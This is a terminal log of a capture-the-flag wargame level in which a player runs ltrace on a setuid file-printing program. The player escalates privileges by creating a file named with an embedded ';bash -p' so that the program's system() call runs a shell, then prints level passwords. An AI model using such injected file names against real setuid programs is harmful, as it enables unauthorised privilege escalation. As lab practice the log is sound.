leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/levaithan3
You cant have that file...
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/levaithan2
You cant have that file...
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)       = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                         = 12002
geteuid()                                         = 12002
setreuid(12002, 12002)                            = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                            = 0
+++ exited (status 0) +++
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)       = -1
puts("You cant have that file..."You cant have that file...
)                = 27
+++ exited (status 1) +++
leviathan2@leviathan:~$ touch /tmp/'idk;bash -p'
leviathan2@leviathan:~$ ./printfile '/tmp/idk;bash -p'
/bin/cat: /tmp/idk: No such file or directory
leviathan3@leviathan:~$ id
uid=12003(leviathan3) gid=12002(leviathan2) groups=12002(leviathan2)
leviathan3@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
Ahdiemoo1j
.
.
.
// leviiathan3:Ahdiemoo1j
.
.
.
